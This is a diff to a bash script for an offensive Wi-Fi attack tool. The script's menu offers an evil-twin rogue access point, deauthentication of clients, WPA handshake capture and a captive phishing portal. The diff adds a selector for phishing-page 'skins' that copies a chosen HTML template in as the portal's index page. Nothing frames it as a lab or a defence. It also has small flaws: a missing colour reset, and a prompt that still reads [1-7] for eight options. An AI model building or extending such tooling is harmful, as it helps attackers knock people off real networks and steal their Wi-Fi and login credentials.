@@ -161,6 +161,21 @@ function phishing_portal() {
     pkill -f "python3 $PHISH_PORTAL/server.py"
 }
 
+#---- 6. skin selector ----#
+
+function select_portal_skin() {
+    echo -e "${CYAN}Available phishing portal skins:${NC}"
+    skins=(phishing_portal/skins/*.html)
+    for i in "${!skins[@]}"; do
+        bname=$(basename "${skins[$i]}")
+        echo "$((i+1))) $bname"
+    done
+    read -p "Select a skin by number: " skn
+    [[ "$skn" =~ ^[0-9]+$ ]] && (( skn >= 1 && skn <= ${#skins[@]} )) || { echo "Invalid choice"; return; }
+    cp "${skins[$((skn-1))]}" phishing_portal/index.html
+    echo -e "${GREEN}[✓] Selected skin: $(basename "${skins[$((skn-1))]}")${NC}"
+}
+
 #---- 6. Menu/Teardown ----#
 while true; do
     banner
@@ -168,18 +183,20 @@ while true; do
     echo -e "${BLUE}2) Start Rogue AP (Evil Twin)${NC}"
     echo -e "${BLUE}3) Deauth client(s) from real AP${NC}"
     echo -e "${BLUE}4) Capture WPA Handshake (.cap)${NC}"
-    echo -e "${BLUE}5) Launch Captive Phishing Portal${NC}"
-    echo -e "${BLUE}6) SAFE TEARDOWN/RESET${NC}"
-    echo -e "${BLUE}7) Exit${NC}"
+    echo -e "${BLUE}5) Select phishing portal skin"
+    echo -e "${BLUE}6) Launch Captive Phishing Portal${NC}"
+    echo -e "${BLUE}7) SAFE TEARDOWN/RESET${NC}"
+    echo -e "${BLUE}8) Exit${NC}"
     echo -ne "${CYAN}Your choice [1-7]: ${NC}"; read CHOICE
     case $CHOICE in
         1) scan_wifi_interfaces_and_networks ;;
         2) start_rogue_ap ;;
         3) deauth_attack ;;
         4) handshake_capture ;;
-        5) phishing_portal ;;
-        6) cleanup ;;
-        7) echo -e "${GREEN}Bye!${NC}"; exit 0 ;;
+        5) select_portal_skin ;;
+        6) phishing_portal ;;
+        7) cleanup ;;
+        8) echo -e "${GREEN}Bye!${NC}"; exit 0 ;;
         *) echo -e "${RED}[!] Invalid option.${NC}" ;;
     esac
     read -p "Press Enter to return to menu..."
